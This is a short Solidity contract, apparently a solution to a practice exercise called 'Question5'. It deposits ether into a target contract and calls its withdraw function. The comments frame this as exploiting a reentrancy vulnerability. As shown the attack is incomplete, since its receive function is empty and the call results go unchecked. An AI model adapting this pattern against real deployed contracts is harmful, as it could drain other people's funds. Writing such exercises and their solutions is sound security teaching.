
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract Solution5 {
    // Define fallback function to receive ether
    receive() external payable {}

    // Define a function to call the vulnerability in Question5 contract
    function exploit(address _question5) public payable {
        require(msg.value >= 1000000000000000000,"amount less");

        (bool success, ) = _question5.call{value: msg.value}(
            abi.encodeWithSignature("deposit()")
        );

        // Call the vulnerable function in Question5 contract to transfer balance to this contract
        (bool success2, ) = _question5.call(
            abi.encodeWithSignature("withdraw()")
        );

        // Check if the transfer is successful
        // require(success, "Exploit failed");


        
        // etherrentrancy.deposit{value: msg.value}();
        // etherrentrancy.withdraw(1 ether);
    }
}
